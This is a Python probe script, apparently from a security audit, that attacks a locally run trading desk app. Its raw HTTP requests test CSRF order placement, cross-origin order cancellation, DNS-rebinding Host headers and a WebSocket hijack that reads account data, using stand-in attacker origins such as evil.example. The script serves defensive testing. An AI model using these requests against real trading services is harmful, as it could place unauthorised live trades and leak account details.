import sys, threading, time, socket, json, base64, os
sys.path.insert(0, "docs/evidence/probes")
from SKEPTIC_F1_common import install_recorder
CALLS = install_recorder(live=True)      # worst case: LIVE account opted in
import uvicorn
from trader.desk import create_app
import trader.alpaca as alpaca
print("alpaca mode as configured:", alpaca._mode_or_none())

app = create_app(background=False, start_agents=False)
cfg = uvicorn.Config(app, host="127.0.0.1", port=8731, log_level="error")
srv = uvicorn.Server(cfg)
threading.Thread(target=srv.run, daemon=True).start()
for _ in range(100):
    try:
        s = socket.create_connection(("127.0.0.1", 8731), 0.2); s.close(); break
    except OSError: time.sleep(0.1)

def raw(req: bytes, read=4096):
    s = socket.create_connection(("127.0.0.1", 8731), 3)
    s.sendall(req); time.sleep(0.6)
    s.settimeout(2)
    out = b""
    try:
        while True:
            b = s.recv(read)
            if not b: break
            out += b
    except Exception: pass
    s.close(); return out

body = '{"symbol":"AAPL","side":"buy","qty":5,"destination":"alpaca","confirm_live":true}'

print("\n--- A. POST /api/desk/orders, NO Content-Type (Blob{type:''} CSRF trick) ---")
CALLS.clear()
r = raw(("POST /api/desk/orders HTTP/1.1\r\nHost: 127.0.0.1:8731\r\n"
         "Origin: https://evil.example\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s"
         % (len(body), body)).encode())
print(r.split(b"\r\n")[0], r.split(b"\r\n\r\n",1)[-1][:160])
print("  broker calls:", [(c['method'], c['path']) for c in CALLS])

print("\n--- B. same but Content-Type: text/plain (plain no-cors fetch) ---")
CALLS.clear()
r = raw(("POST /api/desk/orders HTTP/1.1\r\nHost: 127.0.0.1:8731\r\n"
         "Origin: https://evil.example\r\nContent-Type: text/plain;charset=UTF-8\r\n"
         "Content-Length: %d\r\nConnection: close\r\n\r\n%s" % (len(body), body)).encode())
print(r.split(b"\r\n")[0], r.split(b"\r\n\r\n",1)[-1][:160])
print("  broker calls:", [(c['method'], c['path']) for c in CALLS])

print("\n--- C. CORS preflight for application/json (what a real browser sends first) ---")
r = raw(b"OPTIONS /api/desk/orders HTTP/1.1\r\nHost: 127.0.0.1:8731\r\n"
        b"Origin: https://evil.example\r\nAccess-Control-Request-Method: POST\r\n"
        b"Access-Control-Request-Headers: content-type\r\nConnection: close\r\n\r\n")
print(r.split(b"\r\n\r\n",1)[0].decode(errors="replace")[:400])

print("\n--- D. bodyless POST cancel, cross-origin simple request ---")
CALLS.clear()
r = raw(b"POST /api/desk/orders/7f3a-victim-order/cancel HTTP/1.1\r\nHost: evil.attacker.tld\r\n"
        b"Origin: https://evil.example\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
print(r.split(b"\r\n")[0], r.split(b"\r\n\r\n",1)[-1][:120])
print("  broker calls:", [(c['method'], c['path']) for c in CALLS])

print("\n--- E. arbitrary Host header (DNS-rebinding shape), JSON order ---")
CALLS.clear()
r = raw(("POST /api/desk/orders HTTP/1.1\r\nHost: rebind.attacker.tld:8731\r\n"
         "Origin: http://rebind.attacker.tld:8731\r\nContent-Type: application/json\r\n"
         "Content-Length: %d\r\nConnection: close\r\n\r\n%s" % (len(body), body)).encode())
print(r.split(b"\r\n")[0], r.split(b"\r\n\r\n",1)[-1][:200])
print("  broker calls:", [(c['method'], c['path'], c['kw'].get('json')) for c in CALLS])

print("\n--- F. WebSocket handshake with hostile Origin ---")
key = base64.b64encode(os.urandom(16)).decode()
r = raw(("GET /ws/desk HTTP/1.1\r\nHost: 127.0.0.1:8731\r\nUpgrade: websocket\r\n"
         "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n"
         "Origin: https://evil.example\r\n\r\n" % key).encode(), read=65536)
head, _, payload = r.partition(b"\r\n\r\n")
print(head.decode(errors="replace")[:200])
print("  frame bytes received:", len(payload))
# crude unmask-free read of a server frame (server frames are unmasked)
if payload[:1] in (b"\x81",):
    ln = payload[1]
    if ln < 126: data = payload[2:2+ln]
    elif ln == 126:
        import struct; n = struct.unpack(">H", payload[2:4])[0]; data = payload[4:4+n]
    else:
        import struct; n = struct.unpack(">Q", payload[2:10])[0]; data = payload[10:10+n]
    try:
        msg = json.loads(data)
        print("  LEAKED msg type:", msg.get("type"), "| keys:", list((msg.get("data") or {}).keys()))
        print("  account field  :", json.dumps((msg.get("data") or {}).get("account"))[:200])
    except Exception as e:
        print("  parse fail", e, data[:200])
srv.should_exit = True
